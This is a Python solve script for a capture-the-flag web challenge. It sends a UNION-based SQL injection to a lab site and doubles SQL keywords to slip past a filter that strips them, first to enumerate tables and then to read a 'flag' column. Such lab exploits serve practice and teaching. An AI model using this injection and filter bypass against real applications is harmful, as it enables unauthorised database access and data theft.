# coding=utf-8
import requests


def get_flag(addition):
    index = 0
    while index > -1:
        index = addition.find("select", index)
        if index > -1:
            index += 6
            addition = addition[0:index] + "select " + addition[index:]
            index += 1

    index = 0
    while index > -1:
        index = addition.find("where", index)
        if index > -1:
            index += 5
            addition = addition[0:index] + "where " + addition[index:]
            index += 1

    index = 0
    while index > -1:
        index = addition.find("from", index)
        if index > -1:
            index += 4
            addition = addition[0:index] + "from " + addition[index:]
            index += 1

    index = 0
    while index > -1:
        index = addition.find("union", index)
        if index > -1:
            index += 5
            addition = addition[0:index] + "union " + addition[index:]
            index += 1

    url='http://ctf5.shiyanbar.com/423/web/'
    url+='?id=-1\''
    url+=addition
    url+=' wherewhere  \'1\'=\'1'
    print(url)
    response = requests.get(url)
    print(response.text)

# get_flag("union select * from (select group_concat(table_name) from information_schema.tables)a") # flag
get_flag("union select * from (select flag from flag)a")